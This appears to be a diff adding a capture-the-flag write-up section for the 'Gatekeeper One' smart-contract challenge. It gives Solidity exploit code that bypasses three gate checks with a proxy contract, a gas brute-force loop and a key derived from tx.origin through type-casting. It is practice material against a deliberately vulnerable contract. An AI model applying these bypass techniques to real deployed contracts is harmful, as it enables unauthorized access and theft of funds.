@@ -752,4 +752,75 @@ bytes16 key = bytes16(vm.load(challengeAddress, bytes32(uint256(5))));
 
 ### References
 
- https://docs.soliditylang.org/en/v0.8.18/internals/layout_in_storage.html
+* https://docs.soliditylang.org/en/v0.8.18/internals/layout_in_storage.html
+
+## 13 Gatekeeper One
+
+To beat this level, we need to comply with
+
+```solidity
+instance.entrant() == _player;
+```
+
+### Solution
+
+* `gateOne()`
+
+```solidity
+require(msg.sender != tx.origin);
+```
+
+is passed through by using a proxy contract
+
+* `gateTwo()`
+
+```solidity
+require(gasleft() % 8191 == 0);
+```
+
+just brute force it, these tests are running in a fork
+
+* `gateThree()`
+
+```solidity
+require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+```
+
+`console.log()` the operations on `0x1122334455667788`, use your fav REPL to get the hex conversions
+
+```
+//
+   uint32(uint64(_gateKey))   -> 0x1122334455667788 => 0x55667788
+   uint16(uint64(_gateKey))   -> 0x1122334455667788 => 0x00007788
+   uint64(_gateKey)           -> 0x1122334455667788 => 0x1122334455667788
+   uint16(uint160(tx.origin)) -> 0x00a3...ea72 => ea72
+//
+```
+
+- gateThree part one can be true with `0x1122334400007788`
+- gateThree part two needs both to be different, which is true
+- gateThree part three, make `7788` equal to the last hex digits of tx.origin
+  - ex: `0x1122334400007788` => `0x112233440000ea72`
+  - in fact, it can be 0x100000000000ea72,
+  - which makes it straighforward to get analytically.
+
+Putting all the elements together:
+
+```solidity
+  Proxy proxy = new Proxy(challengeAddress);
+  bytes8 key = bytes8(uint16(uint160(tx.origin)) + 0x1000000000000000);
+
+  // this loop is to brute-force the gateTwo
+  for (uint i = 27000; i > 0; i--) {
+    if (proxy.enter{gas: i}(key)) {
+      require(challengeFactory.validateInstance(payable(challengeAddress), tx.origin));
+      break;
+    }
+  }
+```
+
+### References
+
+* https://docs.soliditylang.org/en/v0.8.19/contracts.html#function-modifiers
